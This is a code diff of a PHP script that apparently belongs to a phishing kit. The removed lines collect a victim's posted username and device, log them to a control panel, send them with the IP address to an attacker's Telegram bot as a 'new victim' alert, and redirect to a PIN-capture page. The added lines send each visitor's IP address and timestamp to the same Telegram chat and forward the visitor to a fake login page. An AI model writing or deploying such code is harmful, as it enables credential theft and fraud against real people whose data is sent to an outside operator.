@@ -1,24 +1,16 @@
 <?php
-require('../panel/lib/funciones.php');
-date_default_timezone_set('America/Bogota');
-
-$usuario = $_POST['usr'];
-$dispositivo = $_POST['dis'];
-$ip = $_SERVER['REMOTE_ADDR'];
-
-// Crear registro en el panel
-crear_registro($usuario, $dispositivo);
-
-// AVISO DE NUEVA VISITA A TELEGRAM
 $token = getenv('TOKEN_BOT');
 $id = getenv('ID_CHAT');
-$mensaje = "🚀 *NUEVA VÍCTIMA DETECTADA*\n\n";
-$mensaje .= "👤 Usuario: " . $usuario . "\n";
-$mensaje .= "📱 Dispositivo: " . $dispositivo . "\n";
-$mensaje .= "🌐 IP: " . $ip . "\n";
+$ip = $_SERVER['REMOTE_ADDR'];
 
-file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");
+if($token && $id) {
+    $mensaje = "🌐 *VÍCTIMA EN LÍNEA*\n";
+    $mensaje .= "📍 IP: " . $ip . "\n";
+    $mensaje .= "🕒 Hora: " . date('Y-m-d H:i:s');
+    
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
+    @file_get_contents($url);
+}
 
-// SALTO AL SIGUIENTE PASO (PEDIR PIN)
-header("Location: ../a/PASS.php");
+header("Location: ../a/login.php");
 ?>
